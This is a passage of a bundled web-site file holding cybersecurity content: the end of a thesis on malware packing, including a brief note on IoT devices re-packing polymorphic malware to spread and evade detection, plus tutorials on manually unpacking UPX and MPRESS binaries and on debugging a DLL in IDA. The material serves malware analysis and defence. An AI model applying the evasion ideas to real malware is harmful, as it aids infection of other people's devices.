algorithm and AES encryption algorithms. Their execution time and power consumption have been measured in different states such as with no packing, with UPX packing and AES packing. The table below shows the data from the experiment and the difference in the measurements.</p>","<p><img src=\\"/cyber/thesis/75.png\\" alt=\\"\\"></p>"]},{"id":"10.4 IoT Embedded System for malware distribution","title":"<h3>10.4 IoT Embedded System for malware distribution</h3>","body":["<p>IoT Embedded Systems can be infected or used for malware distribution. Through the results obtained, it is possible to see how fast the execution of programs packed specially with UPX are. On average between the two programs (MD5 and AES), the average execution time is about 0.45sec. despite having significantly limited computation power. By compromising a device an attacker can use it to make lateral movement and infect other devices in the network.</p>","<p>This works particularly well in the case of polymorphic malware where each time after compromising a device it is possible to re-pack the malware so that it has a different signature to infect subsequent devices. This would increase the chances of infection and reduce detection by security systems.</p>","<p><img src=\\"/cyber/thesis/76.png\\" alt=\\"\\"></p>"]},{"id":"10.5 Packing Limitations","title":"<h3>10.5 Packing Limitations</h3>","body":["<p>Given the reduced computational power, the packing algorithm cannot be the same as in standard computing systems. That is, the packer in an Embedded IoT system cannot implement all the evasion features and advanced anti-debugging techniques such as parallel execution and unpacking through different child processes or threads. This would drastically increase execution times. So, in this regard, malware and packers for these systems have to be crafted in a very specific way keeping in mind power consumption and execution time.</p>"]}]},{"id":"11 Conclusions","title":"<h2><span style=\\"color:#da1953\\">11 Co</span>nclusions</h2>","body":["<p>In this thesis we studied about malwares, in particular about malware packing and unpacking. We studied the basics of packing and unpacking techniques with a practical demonstration on how to unpack UPX and MPRESS packers. The virtual analysis environment was also described in order to replicate the demonstration and guidelines has been provided to safely test malware without risking infecting the host machine.</p>","<p>Furthermore, more advanced packing techniques has been studied to understand their behaviour and evasion techniques. The study of such packing, packer identification and unpacking techniques shows that although malware implement evasion techniques that are hard and time consuming to analyze, with the proposed advanced analysis techniques it is possible, with a moderate percentage of success rate, to analyze, identify and extract packed code.</p>","<p>Such operations by automatic analysis systems are also highly time consuming, so they are not always possible to completely apply and execute in a real-world scenario. With the advancement of technology and with the development with more efficient techniques, that will reduce the identification and analysis time, it will be possible to create a substantial database to detect packers and analyze them in a reasonable time to identify malware. Only then it will be possible to apply such systems for commercial purpose or in a relatively large network where countless files must be analyzed.</p>"]},{"id":"A Bibliography","title":"<h2><span style=\\"color:#da1953\\">A Bi</span>bliography</h2>","body":["<p>[1] Nirav Bhojani, Malware Analysis, Research Gate, Ethical Hacking At: Nirma University, October 2014, DOI: 10.13140/2.1.4750.6889.</p>","<p>[2] VMWare Workstation Pro, https://www.vmware.com/uk/products/workstation-pro.html, VMWare.</p>","<p>[3] PEStudio, https://pestudio.en.lo4d.com/windows, Marc Ochsenmeier</p>","<p>[4] Detect It Easy, https://github.com/horsicq/Detect-It-Easy, Hors.</p>","<p>[5] Ida Free, https://hex-rays.com/ida-free/, hex-rays.</p>","<p>[6] Scylla, https://github.com/NtQuery/Scylla, NtQuery.</p>","<p>[7] ByeongHo Jung1 Seong Il Bae, Chang Choi, Eul Gyu Im, Packer identification method based on byte sequences, John Wiley & Sons, 23 October 2018, DOI: 10.1002/cpe.5082.</p>","<p>[8] Stephen J. Bigelow, https://www.techtarget.com/searchsecurity/definition/micro-VM-micro-virtual-machine, TechTarget, December 2021.</p>","<p>[9] Packers Xabier Ugarte-Pedrero, Davide Balzarottiy, Igor Santos, Pablo G. Bringas, SoK: Deep Packer Inspection: A Longitudinal Study of the Complexity of Run-Time, in 2015 IEEE Symposium on Security and Privacy, 20 July 2015, DOI: 10.1109/SP.2015.46. </p>","<p>[11] Jackson T., Syswhispers2, https://github.com/jthuraisamy/</p>","<p>[12] Emeric Nasi, Bypass Antivirus Dynamic Analysis, Sevagas, 08/2014.</p>","<p>[13]  Xabier Ugarte-Pedrero, Davide Balzarotti, Igor Santos, and Pablo G. Bringas, RAMBO: Run-time packer Analysis with Multiple Branch Observation, Springer, Cham, 12 June 2016, https://doi.org/10.1007/978-3-319-40667-1_10.</p>","<p>[14] Silvio Cesare, Student Member, IEEE, Yang Xiang, Senior Member, IEEE, and Wanlei Zhou, Senior Member, Malwise\u2014An Effective and Efficient Classification System for Packed and Polymorphic Malware, in IEEE transactions on computers, 19 March 2012, DOI: 10.1109/TC.2012.65.</p>","<p>[15] Min Gyung Kang, Pongsin Poosankam, and Heng Yin, Renovo: A Hidden Code Extractor for Packed Executables, WORM\u201907, November 2, 2007, ACM 978-1-59593-886-2/07/0011.</p>","<p>[16] Tom Brosch, Maik, Morgenstern, Runtime Packer: The Hidden Problem, Black Hat USA, January 2006.</p>","<p>[17] Symbolic execution, https://en.wikipedia.org/wiki/Symbolic_execution</p>","<p>[18]  Satyajit Daulaguphu, Exciting Journey Towards Import Address Table (IAT) of an Executable, https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/</p>","<p>[19] Themida, https://www.oreans.com/Themida.php, Oreans, Software Security and Licensing Solutions.</p>","<p>[20]  Arie Olshtein, Following the Scent of Trickgate: 6-Year-Old Packer Used to Deploy the Most Wanted Malware, Check Point Research, January 30, 2023. </p>","<p>[21] https://reverseengineering.stackexchange.com/questions/2142/what-is-import-reconstruction-and-why-is-it-necessary, Stack Exchange.</p>","<p>[22] Packed Malware Basics, Arridae Infosec Pvt. Ltd., Jan 08, 2020. </p>","<p>[23] Metamorphic Code, https://en.wikipedia.org/wiki/Metamorphic_code</p>","<p>[24] Debugger flow control: Hardware breakpoints vs software breakpoints http://www.nynaeve.net/?p=80</p>","<p>[25] Import table vs Import Address Table https://reverseengineering.stackexchange.com/questions/16870/import-table-vs-import-address-table</p>","<p>[26] Riccardo Meggiato, Themida, il tool che protegge gli eseguibili e piace ai malware, cybersecurity360, 25 Gen 2022.</p>","<p>[27] Commando VM, https://github.com/mandiant/commando-vm</p>","<p>[28] Symbolic Execution, https://en.wikipedia.org/wiki/Symbolic_execution, Wikipedia.</p>","<p>[29] Kurt Baker, Malware Analysis, crowdstrike, April 17, 2023.</p>","<p>[30] PE Format, https://learn.microsoft.com/en-us/windows/win32/debug/pe-format, Microsoft, 03-24-2023.</p>","<p>[31] Saurabh Dept., Advance Malware Analysis Using Static and Dynamic Methodology, IEEE, 19 December 2019, DOI: 10.1109/ICACAT.2018.8933769.</p>","<p>[32] ASPack, http://www.aspack.com/, StarForce Technologies Inc.</p>","<p>[33] Yuxin Gao, Zexin Lu, Yuqing Luo, Survey on malware anti-analysis Yuxin Gao, IEEE, 15 January 2015, DOI: 10.1109/ICICIP.2014.7010353.</p>","<p>[34] Forrest Orr, Phantom DLL Hollowing, Forrest-orr.net, Oct 19, 2020.</p>","<p>[35] Binlin Cheng, Jiang Ming, Jianmin Fu, Guojun Peng, Ting Chen, Xiaosong Zhang, Jean-Yves Marion, Towards Paving the Way for Large-Scale Windows Malware Analysis: Generic Binary Unpacking with Orders-of-Magnitude Performance Boost, 2018 ACM SIGSAC Conference, 15 October 2018, https://doi.org/10.1145/3243734.3243771.</p>","<p>[36] Min-Jae Kim, Jin-Young Lee, Hye-Young Chang, SeongJe Cho, Yongsu Park, Minkyu Park, Philip A. Wilsey, Design and Performance Evaluation of Binary Code Packing for Protecting Embedded Software against Reverse Engineering, IEEE, 07 June 2010, DOI: 10.1109/ISORC.2010.23.</p>","<p>[37] Alessandro Mantovani, Simone Aonzo, Xabier Ugarte-Pedrero, Alessio Merlo, Davide Balzarotti, Prevalence and Impact of Low-Entropy Packing Schemes in the Malware Ecosystem, Network and Distributed System Security (NDSS) Symposium, 23-26 February 2020, https://doi.org/10.14722/ndss.2020.24297.</p>","<p>[38] Wei Yan, Zheng Zhang, Nirwan Ansari, Revealing Packed Malware, IEEE, 07 October 2008, DOI: 10.1109/MSP.2008.126.</p>","<p>[39] Yuxin Gao, Zexin Lu, and Yuqing Luo, Survey on malware anti-analysis, Fifth International Conference on Intelligence Control and Information Processing, IEEE, 20 Aug 2014, DOI: 10.1109/ICICIP.2014.7010353.</p>","<p>[40] Donghwi Shin, Chaetae Im, Hyuncheol Jeong, Seungjoo Kim, Dongho Won, The New Signature Generation Method Based on an Unpacking Algorithm and Procedure for a Packer Detection, International Journal of Advanced Science and Technology, 7 February 2011.</p>","<p>[41] Robert Lyda, James Hamrock, Using Entropy Analysis to Find Encrypted and Packed Malware, in IEEE Security & Privacy, DOI: 10.1109/MSP.2007.48.</p>","<p>[42] Trivikram Muralidharan, Aviad Cohen, Noa Gerson, Nir Nissim, File Packing from the Malware Perspective: Techniques, Analysis Approaches, and Directions for Enhancements, ACM Computing, 03 December 2022, https://doi.org/10.1145/3530810.</p>","<p>[43] Li Sun, Steven Versteeg, Serdar Bozta\u015f, Trevor Yann, Pattern Recognition Techniques for the Classification of Malware Packers, Springer, Berlin, Heidelberg, Australasian Conference on Information Security and Privacy (ACISP) 2010, https://doi.org/10.1007/978-3-642-14081-5_23.</p>","<p>[44] Xingwei Li, Zheng Shan, Fudong Liu, Yihang Chen, Yifan Hou, A Consistently-Executing Graph-Based Approach for Malware Packer Identification, IEEE, 23 April 2019, DOI: 10.1109/ACCESS.2019.2910268.</p>","<p>[45] Anitta Patience Namanya, Andrea Cullen, Irfan U. Awan, Jules Pagna Disso, The World of Malware: An Overview, in 2018 IEEE 6th International Conference on Future Internet of Things and Cloud (FiCloud), 11 September 2018, DOI: 10.1109/FiCloud.2018.00067.</p>","<p>[46] Philip O\'Kane; Sakir Sezer, Kieran McLaughlin, Obfuscation: The Hidden Malware, in IEEE Security & Privacy, 04 August 2011, DOI: 10.1109/MSP.2011.98.</p>","<p>[47] Gr\xe9goire Jacob, Paolo Milani Comparetti, Matthias Neugschwandtner, Christopher Kruegel & Giovanni Vigna, A Static, Packer-Agnostic Filter to Detect Similar Malware Samples, International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA) 2012, https://doi.org/10.1007/978-3-642-37300-8_6.</p>","<p>[48] Kesav Kancherla, Srinivas Mukkamala, Image visualization based malware detection, in 2013 IEEE Symposium on Computational Intelligence in Cyber Security (CICS), 16 September 2013, DOI: 10.1109/CICYBS.2013.6597204.</p>","<p>[49] Veeramani R, Nitin Rai, Windows API based Malware Detection and Framework Analysis, ACSAC \'20: Annual Computer Security Applications Conference, 08 December 2020, https://doi.org/10.1145/3427228.3427242.</p>","<p>[50] Jana \u0160\u0165astn\xe1, Martin Tom\xe1\u0161ek, Exploring Malware Behaviour for Improvement of Malware Signatures, in 2015 IEEE 13th International Scientific Conference on Informatics, 11 January 2016, DOI: 10.1109/Informatics.2015.7377846.</p>","<p>[51] Fanglu Guo, Peter Ferrie, Tzi-cker Chiueh, A Study of the Packer Problem and Its Solutions, International Workshop on Recent Advances in Intrusion Detection (RAID) 2018, Springer, Berlin, Heidelberg, https://doi.org/10.1007/978-3-540-87403-4_6.</p>","<p>[52] Binlin Cheng ,Jiang Ming, Jianmin Fu, Guojun Peng, Ting Chen, Xiaosong Zhang, Jean-Yves Marion, Towards Paving the Way for Large-Scale Windows Malware Analysis: Generic Binary Unpacking with Orders-of-Magnitude Performance Boost, CCS \'18: Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security, 15 October 2018, https://doi.org/10.1145/3243734.3243771</p>","<p>[53] Kevin A. Roundy, Barton P. Miller, Binary-code obfuscations in prevalent packer tools, ACM Computing Surveys, 11 July 2013, https://doi.org/10.1145/2522968.2522972. </p>","<p>[54] Joan Calvet, Fanny Lalonde Levesque, Erwann Traourouder, Fran\xe7ois Menet, Jos\xe9 M. Fernandez, Jean-Yves Marion, WaveAtlas: Surfing Through the Landscape of Current Malware Packers, Virus Bulletin Conference, 30 Sept 2015.</p>","<p>[55] Dhruwajita Devi, Sukumar Nandi, Detection of packed malware, SecurIT \'12: Proceedings of the First International Conference on Security of Internet of Things, August 2012, https://doi.org/10.1145/2490428.2490431.</p>","<p>[56] Min-Jae Kim, Jin-Young Lee, Hye-Young Chang, SeongJe Cho, Yongsu Park, Minkyu Park, Philip A. Wilsey, Design and Performance Evaluation of Binary Code Packing for Protecting Embedded Software against Reverse Engineering, IEEE International Symposium on Object/Component/Service-Oriented Real-Time Distributed Computing, 07 June 2010, DOI: 10.1109/ISORC.2010.23.</p>","<p>[57] IoT Embedded System, https://emteria.com/blog/iot-embedded-system#:~:text=The%20difference%20between%20an%20embedded,of%20devices%20and%20use%20cases, Emetria, 5 Jul 2022."]}]}]}')},698:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Manual Unpacking of UPX and MPRESS","tags":["security","reverse engineering","malware"],"date":"27/06/2023","banner":"upxmpress/banner.webp","location":"./blog/","type":"blog","search":[{"section":"Packing Indicators","description":"Extracting packing indicators to confirm the presence of packing whether UPX or MPRESS. Using tools like DIE - Detect it Easy and PEStudio"},{"section":"Manual Unpacking of UPX","description":"Manual unpacking of UPX packer. Found the code entry point (a long jump to a different section) with IDA, executed the code up automatically unpack it and extracted the original code with Scylla"},{"section":"Manual Unpacking of MPRESS","description":"Manual unpacking of MPRESS packer. Executed the code with the use of hardware breakpoint to decrypt the code automatically. Used Scylla to extract the original code"}],"body":[{"id":"Manual Unpacking of UPX and MPRESS","title":"<h1> <span style=\\"color:#da1953\\">Man</span>ual Unpacking UPX and MPRESS </h1><hr>","body":[{"id":"banner","title":"banner","body":["<img src=\\"/cyber/upxmpress/banner.webp\\" alt=\\"\\"><hr>"]},{"id":"Introduction","title":"<hr><h2><span style=\\"color:#da1953\\">Int</span>roduction</h2>","body":["<blockquote><p><em>\u201cPacking is a technique to hide the original code of a program through one or more layers of compression and/or encryption. Used by malware writers to make static analysis harde, to hide from certain antivirus products via polymorphism (diversity), as packers are used to shrink benevolent programs, they cannot be banned! In-depth analysis of packed malware usually starts in a debugger: in other words, we must unpack the sample\u2026\\"</em></p></blockquote>","<p>The tools I am going to use are:</p>","<ul><li>PEStudio</li><li>Detect It Easy</li><li>IDA (Free)</li><li>Scylla</li></ul><br>"]},{"id":"Packing Indicators","title":"<h2> <span style=\\"color:#da1953\\">Pac</span>king Indicators </h2>","body":["<p>Before doing the unpacking I have to understand if the binary is packed or not and to do this I will use two tools in particular, <strong>Detect It Easy</strong> and <strong>PEStudio</strong>.</p>","<p>I load the binary with <strong>Detect It Easy</strong> to see what information it gives to me.</p>","<p><img src=\\"/cyber/upxmpress/image15.png\\" alt=\\"\\"></p>","<p><strong>Detect It Easy</strong> tells me that it is packed with <strong>UPX</strong> and it also tell the version (3.93), another useful information is the number of sections, to check it is accuracy I also check entropy.</p>","<p><img src=\\"/cyber/upxmpress/image17.png\\" alt=\\"\\"></p>","<p>I check it to be sure that it\u2019s packed, sometimes it could show that the binary is not packed but it has a high level of entropy which is a good indication of packing.</p>","<p>I also need to check the type of the binary (<strong>H</strong>-hexadecimal key in the main window of <strong>Detect It Easy</strong>), even if I know it, I have to be sure.</p>","<p>(<strong>MZ</strong>) These two characters indicate that the binary is a <strong>PE</strong> (Portable Executable) but they might get changed by the attacker, in this case by viewing the number of next bytes I can detect if it\u2019s really a <strong>PE</strong> or not.</p>","<p><img src=\\"/cyber/upxmpress/image32.png\\" alt=\\"\\"></p>","<p>Now I go to <strong>PEStudio</strong> to see what information I can collect and if it also confirms that it is packed.</p>","<p>The first thing I am going to check is the size of the binary to get an idea of \u200b\u200bwho am I dealing with.</p>","<p>If the file is very large it cannot have few imports while for a small file it is plausible but it is not said therefore not to trust is better.</p>","<p><img src=\\"/cyber/upxmpress/image14.png\\" alt=\\"\\"></p>","<p>Here, in addition to the file size, I also see the entropy (7,114) which is very high equal to <strong>Detect It Easy</strong> and therefore it seems that it is packed. I also have the signature confirming that it is packed with UPX.</p>","<p>Now I check the sections, in particular <em>&ldquo;Virtual-Size&rdquo;</em> and <em>&ldquo;Raw-Size&rdquo;</em> of the sections. if at last in one of them the difference is so high it\u2019s a good indicator of packing.</p>","<p>If at least one section has a very high entropy then it is another good indicator of packing (MAX-Entropy: 8), also if at least one section has <strong>WX</strong> (Writable and Executable) permission is also an indicator of packing.</p>","<p><img src=\\"/cyber/upxmpress/image4.png\\" alt=\\"\\"></p>","<p>Now I check the imports, if the imports are so few it\u2019s a good indicator of packing, if <em>\u201cGetProcess\u201d</em> and <em>\u201cLoadLibraryA\u201d</em> are the only imports shown in the PEStudio then it is sure that the binary is packed.</p>","<p><img src=\\"/cyber/upxmpress/image31.png\\" alt=\\"\\"></p>","<p>In this case I have too few imports, there are cases where only the two imports mentioned above are shown.</p>","<p>At last I search the strings in search of the packer\u2019s name, to make the search easier I ordered the strings in descending order.</p>","<p><img src=\\"/cyber/upxmpress/image18.png\\" alt=\\"\\"></p>","<p>Now that I am sure that the binary is packed I will show how to unpack in the two cases where it is packed with MPRESS and the case where it is packed with UPX.</p>","<p>For the first part I used a packed binary with UPX but the results of <strong>PEStudio</strong> and <strong>Detect It Easy</strong> would be almost identical if the file had been packed with MPRESS.</p>",""]},{"id":"Manual Unpacking of UPX","title":"<h2> <span style=\\"color:#da1953\\">Man</span>ual Unpacking of UPX </h2>","body":["<p>To do the unpacking I use <strong>IDA</strong>, any version is fine in my case it is <strong>IDA Free</strong> and I load the binary as <strong>PE</strong>.</p>","<p><img src=\\"/cyber/upxmpress/image25.png\\" alt=\\"\\"></p>","<p>Once the binary is loaded, <strong>IDA</strong> warns me that some imports are not visible and that <strong>IAT</strong> (Import Address Table) is located outside the memory range and this further confirms that the binary is packed.</p>","<p><img src=\\"/cyber/upxmpress/image20.png\\" alt=\\"\\"></p>","<p>To unpack <strong>UPX</strong> I have to look for a <em>&ldquo;tail jump&rdquo;</em>, it is called <em>&ldquo;tail jump&rdquo;</em> because it is usually at the end of the program. This jump has a peculiarity therefore jump from one section to another and therefore it is a very long jump.</p>","<p><img src=\\"/cyber/upxmpress/image13.png\\" alt=\\"\\"></p>","<p>Here I have a jump in the <strong>UPX1</strong> section which goes to another section and jumps to address <strong>402284</strong>.</p>","<p><img src=\\"/cyber/upxmpress/image22.png\\" alt=\\"\\"></p>","<p>In fact I see that the address <strong>402284</strong> is in the <strong>UPX0</strong> section and there are no other jumps of this type so I can conclude that I have found the tail jump.</p>","<p>At this point I put a breakpoint at address <strong>402284</strong> and run the binary and this message confirms once again that the binary is packed.</p>","<p><img src=\\"/cyber/upxmpress/image26.png\\" alt=\\"\\"></p>","<p>Select <em>\u201cyes\u201d</em>.</p>","<p>After the execution the code has changed, now I can see the code that was hidden / compressed inside it.</p>","<p><img src=\\"/cyber/upxmpress/image11.png\\" alt=\\"\\"></p>","<p>I am on a <em>&ldquo;call&rdquo;</em> statement, where I should really be. At this point I can use both the address of the jump instruction (<strong>402284</strong>) and the address to which it jumps (<strong>402558</strong>) as <strong>OEP</strong> (Original Entry Point) and in both addresses they work fine.</p>","<p>In order to unpack I use <strong>Scylla</strong> and in the <strong>OEP</strong> field I write one of the two addresses.</p>","<p><strong><strong>During these operations I must leave IDA running in debug I cannot close it.</strong></strong></p>","<ol><li>I select the process of IDA running the sample.</li><li>I insert in the OEP field the address found on IDA.</li><li>Click \u201cIAT Autosearch\u201d</li></ol>","<p>And it would successfully find the start address and the size. <em><strong>If not it is a good practice to to restart every time Scylla because its buggy</strong></em>.</p>","<p><img src=\\"/cyber/upxmpress/image10.png\\" alt=\\"\\"></p>","<p>At this point I can get the imports simply by clicking <em>&ldquo;Get Imports&rdquo;</em>.</p>","<p><img src=\\"/cyber/upxmpress/image30.png\\" alt=\\"\\"></p>","<p>84 imports were found, since I own the unpacked binary I can double check if the found imports are correct.</p>","<p><img src=\\"/cyber/upxmpress/image19.png\\" alt=\\"\\"></p>","<p>In fact <strong>PEStudio</strong> tells me that the unpacked binary has 84 imports so my process has been successful.</p>","<p>To create the unpacked binary, I click on <em>&ldquo;Dump&rdquo;</em> and save the file.</p>","<p><img src=\\"/cyber/upxmpress/image34.png\\" alt=\\"\\"></p>","<p>Now just I click on <em>&ldquo;Fix Dump&rdquo;</em> and choose the dump created previously to create the unpacked binary.</p>","<p><img src=\\"/cyber/upxmpress/image29.png\\" alt=\\"\\"></p>","<p>To make a further check, I load the new binary with <strong>PEStudio</strong>.</p>","<p><img src=\\"/cyber/upxmpress/image9.png\\" alt=\\"\\"></p>","<p>Here I can see the difference between the original packed binary and the unpacked binary created by me.</p>","<p>The first thing I notice is the size of my file is much larger, which I expected, while the imports of my binary are 0 but this is not a problem because it is a problem during the creation of the new binary with <strong>Scylla</strong> , as long as <strong>Shylla</strong> has found the imports correctly there are no problems even if <strong>PEStudio</strong> does not show them, lastly I see that there are many more strings than before.</p>","<p>And this concludes the manual unpacking of a packed binary with <strong>UPX</strong>.</p>",""]},{"id":"Manual Unpacking of MPRESS","title":"<h2 id=MANUNPACMPRESS> <span style=\\"color:#da1953\\">Man</span>ual Unpacking of MPRESS </h2>","body":["<p>The identification of a packed binary with <strong>MPRESS</strong> is identical to that of <strong>UPX</strong> shown above. Loading the binary with <strong>IDA</strong> tells me directly that maybe it is packed.</p>","<p><img src=\\"/cyber/upxmpress/image2.png\\" alt=\\"\\"></p>","<p>Once the binary is loaded I should be faced with a <em>pusha</em> instruction, if this were not the case, just select the start function and put a breakpoint.</p>","<p><img src=\\"/cyber/upxmpress/image21.png\\" alt=\\"\\"></p>","<p>Now I run the binary paying particular attention to the <em>Stack View</em> window (down right corner window).</p>","<p><img src=\\"/cyber/upxmpress/image5.png\\" alt=\\"\\"></p>","<p>I step over once and notice that the addresses on the stack have changed.</p>","<p><img src=\\"/cyber/upxmpress/image7.png\\" alt=\\"\\"></p>","<p>Now the stack points to start, I step over until I come back again on the start, since the start on the stack appears twice once at <strong>9FF64</strong> and once at <strong>9FF68</strong>.</p>","<p>In my case it was enough for me to do <em>Step Over</em> twice.</p>","<p><img src=\\"/cyber/upxmpress/image1.png\\" alt=\\"\\"></p>","<p>Note that I started from <em>pusha</em> instruction at <strong>4512D7</strong> and now I am at <strong>4512DE</strong>.</p>","<p>Now I right click on the stack address <strong>19FF64</strong> and follow in hex dump.</p>","<p><img src=\\"/cyber/upxmpress/image36.png\\" alt=\\"\\"></p>","<p>The <em>Hex View-1</em> window will change and a byte will be highlighted.</p>","<p><img src=\\"/cyber/upxmpress/image16.png\\" alt=\\"\\"></p>","<p>Now I select the four bytes (DWORD) starting from <strong>D7</strong> and put a breakpoint on it which will be a hardware breakpoint with read and write permission (WR), the permissions <strong>WR</strong> will be set automatically but it is possible to view the breakpoint and modify it but in this case is not needed.</p>","<p><img src=\\"/cyber/upxmpress/image3.png\\" alt=\\"\\"></p>","<p>Now I run the binary with the <em>Play</em> button and I will hit the hardware breakpoint.</p>","<p><img src=\\"/cyber/upxmpress/image28.png\\" alt=\\"\\"></p>","<p>and <strong>IDA</strong> will detect that <strong>RIP</strong> point is not in a defined address same as for <strong>UPX</strong>.</p>","<p><img src=\\"/cyber/upxmpress/image8.png\\" alt=\\"\\"></p>","<p>Upon pressing <em>Yes</em> the code will change and I\u2019m suddenly in a <em>call</em> instruction and I step into, <strong>IDA</strong> will tell me again the same message about <strong>RIP</strong> pointing in an undefined address.</p>","<p>I can\u2019t use the address of <em>call</em> instruction (402BA6) as I did for <strong>UPX</strong> but I have to use the address pointed by the <em>call</em> instruction (401B54).</p>","<p><img src=\\"/cyber/upxmpress/image24.png\\" alt=\\"\\"></p>","<p>And the address <strong>401B54</strong> is my <strong>OEP</strong> which I will use in <strong>Scylla</strong> to unpack it.</p>","<p>Once found the <strong>OEP</strong> the unpacking process will be identical to <strong>UPX</strong> but for completeness I rewrite it anyway.</p>","<p>Remember to restart <strong>Scylla</strong> every time because it\u2019s buggy. Also here I can\u2019t close the <strong>IDA</strong> process which is in debugging.</p>","<p>In order to unpack I follow the same steps as for <strong>UPX</strong>.</p>","<ol><li>I select the process of <strong>IDA</strong> running the sample.</li><li>I insert in the <strong>OEP</strong> field the address found on <strong>IDA</strong>.</li><li>Click <em>\u201cIAT Autosearch\u201d</em></li></ol>","<p>And it would successfully find the <em>start</em> address and the size.</p>","<p><img src=\\"/cyber/upxmpress/image23.png\\" alt=\\"\\"></p>","<p>At this point we can get the imports simply by clicking <em>&ldquo;Get Imports&rdquo;</em>.</p>","<p><img src=\\"/cyber/upxmpress/image6.png\\" alt=\\"\\"></p>","<p>68 imports were found, since I own the unpacked binary also for this I can double check if the found imports are correct.</p>","<p><img src=\\"/cyber/upxmpress/image35.png\\" alt=\\"\\"></p>","<p>In fact <strong>PEStudio</strong> tells me that the unpacked binary has 68 imports so my process has been successful.</p>","<p>To create the unpacked binary, click on <em>&ldquo;Dump&rdquo;</em> and save the file.</p>","<p><img src=\\"/cyber/upxmpress/image12.png\\" alt=\\"\\"></p>","<p>Now just click on <em>&ldquo;Fix Dump&rdquo;</em> and choose the dump created previously to create the unpacked binary.</p>","<p><img src=\\"/cyber/upxmpress/image33.png\\" alt=\\"\\"></p>","<p>To make a further check, I load the new binary with <strong>PEStudio</strong>.</p>","<p><img src=\\"/cyber/upxmpress/image27.png\\" alt=\\"\\"></p>","<p>Here I can see the differences between the original packed binary and the unpacked binary created by me.</p>","<p>Much like <strong>UPX</strong>, even here the same values change even if the change is not much.</p>","<p>The unpacked version with <strong>Scylla</strong> has 0 imports, same as the <strong>UPX</strong> it\u2019s not a problem as long as during the process <strong>Scylla</strong> found all the imports.</p>","<p>This conclude the manual unpacking of binaries packed with MPRESS.</p>",""]}]}]}')},880:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Run and Debug Dll","tags":["security","reverse engineering","windows"],"date":"11/08/2024","location":"./blog/","banner":"rundebugdll/banner.webp","type":"blog","search":[{"section":"Run DLL","description":"Runnin a DLL with \\"rundll32.exe\\" from the command line"},{"section":"Debug DLL","description":"Debugging the DLL by running it via \\"rundll32.exe\\" from a running IDA to find the DLL entry point (address of the load DLL function) and mapping the base address of a second non-running IDA to match the running IDA to analyze the code"}],"body":[{"id":"Run and Debug DLL","title":"<h1> <span style=\\"color:#da1953\\">Run</span> and Debug Dll</h1><hr>","body":[{"id":"banner","title":"banner","body":["<img src=\\"/cyber/rundebugdll/banner.webp\\" alt=\\"\\"><hr>"]},{"id":"Introduction","title":"<hr><h2><span style=\\"color:#da1953\\">Int</span>roduction </h2>","body":["<p>A DLL is a library that contains functions/code and datato to be used by more than one program at the same time, unlike normal programs it does not contain a <strong>main</strong> function therefore it does not have an entry point for execution.</p>","<p>However, there are various reasons to execute a DLL, for example to solve a CTF, to analyze a DLL dropped by malware or to understand how it works.</p>"]},{"id":"Runand DLL","title":"<h2> <span style=\\"color:#da1953\\">Run</span> DLL </h2>","body":["<p>To run any DLL I have to use <em>rundll</em> program in my case I am using <code>rundll32</code> because the DLL is x86. So in order to run a DLL I have to execute the command <code>rundll32 hellow-world-x86.dll,#2</code> where <strong>#2</strong> is the number of exports.</p>","<p>After the execution, a popup with the message <em>Hello world</em> will appear.</p>","<p><img src=\\"/cyber/rundebugdll/1.jpg\\" alt=\\"\\"></p>"]},{"id":"Debug DLL","title":"<p><h2 id=DBGDLL> <span style=\\"color:#da1953\\">Deb</span>ug DLL </h2></p>","body":["<p>In order to dynamically debug the DLL I am going to use <strong>IDA Free</strong> and as I see trying to run it as usual does not work at all.</p>","<p><img src=\\"/cyber/rundebugdll/3.JPG\\" alt=\\"\\"></p>","<p>Now to run and debug the DLL properly I open two IDA windows, one with the DLL in static analysis and another in dynamic analysis running the DLL via <code>rundll32</code> program in IDA.</p>","<p>Now I open another IDA window and open\xa0rundll32 which is in the path C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe to dynamically analyse my DLL and leave the other IDA window in static analysis in the background (for now).</p>","<p><img src=\\"/cyber/rundebugdll/4.JPG\\" alt=\\"\\"></p>","<p>If this error message appears press <em>&ldquo;Yes&rdquo;</em>, it means I have to choose a different path to save the IDA databases for future analysis and I usually choose my Desktop.</p>","<p><img src=\\"/cyber/rundebugdll/5.JPG\\" alt=\\"\\"></p>","<p>At this point, I have to tell the <code>rundll32</code> loaded in IDA to execute my <code>hello-world-x86.dll</code>.</p>","<p><img src=\\"/cyber/rundebugdll/6.jpg\\" alt=\\"\\"></p>","<p>and a window will pop up where I can insert the parameters that <code>rundll32</code> take which are the name of the DLL to run and its parameters similar to when I executed in the shell, but with the only difference that I have to put the full path of the DLL.</p>","<p><img src=\\"/cyber/rundebugdll/7.jpg\\" alt=\\"\\"></p>","<p>Once set the parameters I have to set the debugger in order to stop at each load and unload of library in this way as soon as my DLL is loaded the process will stop without continuing to go on, at that point I can begin to analyze the DLL\'s code.</p>","<p><img src=\\"/cyber/rundebugdll/8.jpg\\" alt=\\"\\"></p>","<p>At the <em>&ldquo;Debugger setup&rdquo;</em> windows I have to check <em>&ldquo;Suspend on library load/unload&rdquo;</em> in the <em>&ldquo;Event&rdquo;</em> section, and <em>&ldquo;Library load/unload&rdquo;</em> in <em>&ldquo;Logging&rdquo;</em> section.</p>","<p><img src=\\"/cyber/rundebugdll/9.jpg\\" alt=\\"\\"></p>","<p>By enabling logging on load/unload operation I can see what libraries are loading and unloading and when my DLL is being loaded. Now I start debugging by pressing the play button.</p>","<p>I can see the libraries start loading and each time a library is loaded it stops so I have to keep pressing play every time until my library (<code>hello-world-x86.dll</code>) is loaded.</p>","<p><img src=\\"/cyber/rundebugdll/10.JPG\\" alt=\\"\\"></p>","<p>After quite a lot my DLL get loaded.</p>","<p><img src=\\"/cyber/rundebugdll/11.jpg\\" alt=\\"\\"></p>","<p>Now to see at what address the library is loaded I have to look at the <em>&ldquo;Modules List&rdquo;</em> window, if the Windows is not there I can open it.</p>","<p><img src=\\"/cyber/rundebugdll/12.jpg\\" alt=\\"\\"></p>","<p>In my case, the library has been loaded at <strong>73670000</strong>.</p>","<p><img src=\\"/cyber/rundebugdll/13.JPG\\" alt=\\"\\"></p>","<p>If ASLR is on at every run the DLL will be loaded in a different address so in order to match the address from the IDA window of static analysis (which starts at 